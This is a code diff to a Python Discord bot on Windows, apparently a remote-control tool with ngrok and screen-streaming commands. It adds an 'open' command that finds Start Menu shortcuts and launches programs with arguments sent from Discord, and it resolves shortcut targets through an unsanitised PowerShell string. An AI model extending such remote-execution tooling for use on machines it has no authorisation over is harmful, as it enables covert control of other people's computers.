@@ -6,6 +6,7 @@ import io
 import json
 import logging
 import os
+from pathlib import Path
 import platform
 import re
 import shutil
@@ -16,8 +17,10 @@ import subprocess
 import sys
 import tempfile
 from threading import Thread, Event
+import threading
 import time
 import urllib.request
+import webbrowser
 import winreg
 import zipfile
 from datetime import datetime, timedelta, timezone
@@ -477,6 +480,64 @@ async def stop(ctx):
             await ctx.send(f"Error stopping ngrok: {e}{watermark()}")
 
     await ctx.send("Stream and ngrok tunnel stopped successfully!")
+
+def get_start_menu_paths():
+    paths = []
+    user_start = Path(os.environ.get('APPDATA')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs'
+    if user_start.exists():
+        paths.append(user_start)
+    all_users_start = Path(os.environ.get('PROGRAMDATA')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs'
+    if all_users_start.exists():
+        paths.append(all_users_start)
+    return paths
+
+def search_shortcut(program_name):
+    start_menu_paths = get_start_menu_paths()
+    found_shortcuts = []
+    for start_path in start_menu_paths:
+        for lnk_file in start_path.rglob('*.lnk'):
+            if program_name.lower() in lnk_file.stem.lower():
+                found_shortcuts.append(lnk_file)
+    return found_shortcuts
+
+def get_shortcut_target(lnk_path):
+    try:
+        ps_command = f'''
+        $sh = New-Object -ComObject WScript.Shell
+        $target = $sh.CreateShortcut("{lnk_path}").TargetPath
+        Write-Output $target
+        '''
+        result = subprocess.run(
+            ['powershell', '-Command', ps_command],
+            capture_output=True,
+            text=True,
+            timeout=5
+        )
+        target = result.stdout.strip()
+        return target if target else None
+    except:
+        return None
+
+@bot.command(name='open')
+async def open_program(ctx, program_name: str, *args):
+    shortcuts = search_shortcut(program_name)
+    if not shortcuts:
+        await ctx.send(f"No se encontró el programa **{program_name}**.")
+        return
+    selected_shortcut = shortcuts[0]
+    target_path = get_shortcut_target(selected_shortcut)
+    if target_path and os.path.exists(target_path):
+        program_path = target_path
+    else:
+        program_path = str(selected_shortcut)
+    try:
+        if args:
+            subprocess.Popen([program_path] + list(args))
+        else:
+            os.startfile(program_path)
+        await ctx.send(f"Programa **{selected_shortcut.stem}** lanzado.")
+    except Exception as e:
+        await ctx.send(f"Error al abrir el programa: {e}")
 
 @bot.command()
 async def status(ctx):
